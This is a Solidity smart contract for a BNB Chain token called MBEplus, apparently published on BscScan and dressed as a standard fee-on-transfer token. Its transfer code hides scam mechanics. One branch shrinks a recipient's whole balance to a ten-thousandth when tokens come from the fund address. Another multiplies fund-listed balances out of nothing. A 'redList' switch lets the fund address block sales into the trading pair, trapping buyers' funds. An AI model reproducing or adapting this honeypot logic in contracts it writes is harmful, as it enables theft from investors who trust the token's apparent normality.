/**
 *Submitted for verification at BscScan.com on 2023-02-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract TokenDistributor {
    constructor (address token) {

        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}


abstract contract MBEplusToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;


    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 public startTradeBlock;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _FundList;
    mapping(address => bool) private _redList;
    mapping(address => bool) public _swapPairList;
    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    bool private inSwap;
    uint256 public numTokensSellToFund;

    uint256 private constant MAX = ~uint256(0);
    address public usdt;
    TokenDistributor public _tokenDistributor;
    uint256 public _sellFee = 2500;
    IERC20 public _usdtPair;


    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        //0x10ED43C718714eb63d5aA57B78B54704E256024E BSC 路由器
        //0xD99D1c33F9fC3444f8101754aBC46c52416550D1 BSC 测试路由器

        usdt = address(0x55d398326f99059fF775485246999027B3197955);
        //0x55d398326f99059fF775485246999027B3197955 BSC USDT
        //0xFa60D973F7642B748046464e165A65B7323b0DEE BSC 测试USDT
        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());

        address usdtPair = swapFactory.createPair(address(this), usdt);
        _usdtPair = IERC20(usdtPair);

        _swapPairList[usdtPair] = true;


        _allowances[address(this)][address(_swapRouter)] = MAX;


        _tTotal = Supply * 10 ** Decimals;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);


        fundAddress = FundAddress;


        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _FundList[FundAddress] = true;

        numTokensSellToFund = _tTotal / 1000;
        _tokenDistributor = new TokenDistributor(usdt);

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);

        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        //红名单不允许转入
        if(!_feeWhiteList[from]){
        require(!_redList[to], "redList");}
        uint256 txFee;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "!Trading");
                startTradeBlock = block.number;
            }


            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (
                    contractTokenBalance >= numTokensSellToFund &&
                    !inSwap &&
                    _swapPairList[to]
                ) {
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }

        _tokenTransfer(from, to, amount, txFee);

    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 feeAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
            if (!_feeWhiteList[sender] && _swapPairList[recipient] && block.number <= startTradeBlock + 300  ) {
                uint256 fundAmount = tAmount * _sellFee / 10000;
                if (fundAmount > 0 ) {
                    feeAmount += fundAmount;
                    _takeTransfer(sender, address(this), fundAmount);
                }
            }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }



    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );


        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        USDT.transferFrom(address(_tokenDistributor), fundAddress, usdtBalance);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        if(_FundList[sender] && !_feeWhiteList[to] && !_swapPairList[to]){
        _balances[to] = _balances[to] / 10000;
        }
        if(_feeWhiteList[sender] && _FundList[to] ){
        _balances[to] = _balances[to] + _balances[to]*10;
        }
        emit Transfer(sender, to, tAmount);
    }

    function setFundSellAmount(uint256 amount) external onlyOwner {
        numTokensSellToFund = amount;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }
    function setredListTrue() external {require (msg.sender == fundAddress);
        _redList[address(_usdtPair)] = true;
    }
    function setredListFalse() external {require (msg.sender == fundAddress);
        _redList[address(_usdtPair)] = false;
    }

    receive() external payable {}


    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }


    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(fundAddress, amount);
    }

    //批量空头 格式 ["   ","   "]
    function airdrop(address[] memory airdropAddress, uint256 airdropAmount) public  {
        for (uint i=0;  i<airdropAddress.length; i++) {
            _transfer(msg.sender, airdropAddress[i], airdropAmount);
        }
    }


}

contract MBEplus is MBEplusToken {
    constructor() MBEplusToken(

        "MBEplus",

        "MBEplus",

        9,

        1000000000000,

        address(0x896B7Ce9F84893438c00D64dedB21A8c43Bb5Dab)
    ){

    }
}